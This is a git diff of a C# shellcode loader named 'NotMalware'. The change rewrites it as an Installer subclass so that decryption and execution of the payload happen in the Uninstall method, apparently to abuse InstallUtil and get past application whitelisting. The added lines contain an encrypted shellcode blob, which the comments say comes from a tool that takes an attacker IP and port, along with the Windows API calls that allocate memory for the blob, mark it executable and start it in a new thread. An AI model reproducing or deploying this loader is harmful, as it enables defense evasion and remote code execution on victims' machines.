@@ -1,29 +1,36 @@
 using System;
-using System.Linq;
+using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 
-namespace NotMalware
+public class NotMalware_IU
 {
-    internal class Program
+    public static void Main(string[] args)
     {
-        [DllImport("kernel32")]
-        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    }
+}
 
-        [DllImport("kernel32")]
-        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
+[System.ComponentModel.RunInstaller(true)]
 
-        [DllImport("kernel32")]
-        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+public class A : System.Configuration.Install.Installer
+{
+    [DllImport("kernel32")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
-        [DllImport("kernel32")]
-        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    [DllImport("kernel32")]
+    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
 
-        static void Main(string[] args)
-        {
-            // Shellcode (python3 micr0\ shell.py -i <IP> -p <port> -l csharp)
-            // cyberchefで改行を消してからレシピにかけること
-             string bufEnc = "<shell code>";
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+    [DllImport("kernel32")]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    
+    public override void Uninstall(System.Collections.IDictionary savedState)
+    {
+        // CODE EXECUTION
+        // Shellcode (python3 micr0\ shell.py -i <IP> -p <port> -l csharp)
+             string bufEnc = "65mBeS0pPtoBTR39yW1Gn3TMB0xWtZd5z+4MgzHGu7wSd1Oi45kc29f4nwgIy8BPJV7/7/9a1gLFj4SELS8sp0eFj8O0rCha3Rfh8bvg6otGVE1LVmkvjq+aZZWGvaBnVO+ZIX1kdStdmjmM6/Kb1seFCZCGw6wdC4lS4R8Ya54bBuEsiUwx81Cf6jXCTY4litOZ0dPOJF2t7VhrMAtSQh1Gn/46c18yTs/1VMygOOfC2ZgH/2QS6bQnMujdbuKDkIIfkNnU9twzMfqjxjuehTuA9ScvyRt0YOSMBpFYlk1q28DMovJcKwL5KIspI4aOQvDp1cOFjYNT8qhHVwi8/XEG/GMEmLeHAMfkyhbTa1uPtgACpf1kjcFLDCZimEE4iYDf15B1I7PYwNBfvoNj+UDd/vFESSPmgRuQzMLSM8goIygCJiqdtPvbbQEhOn0HxPqjxm4Gukb1gs3C9dVe5yl2dSTTc0uw3+0pOxOm5cT0liCs8st0eArgDj5azIEIoDnQb4N/l0Aku8xgewsPF47UCBv7pXFjsXE9m5GCbYw3coxaTLBT1v7F7+pLrxyzY/gC3wVoTp4CwjVErvQppD8HZi0rX0kFxcxtqhZ5ThxRMYtgV4UlpSAFUOx0G+w6";
              
              // Decrypt shellcode
             Aes aes = Aes.Create();
@@ -59,6 +66,5 @@ namespace NotMalware
 
             // Wait until the shellcode is done executing
             WaitForSingleObject(hThread, 0xffffffff);
-        }
     }
 }
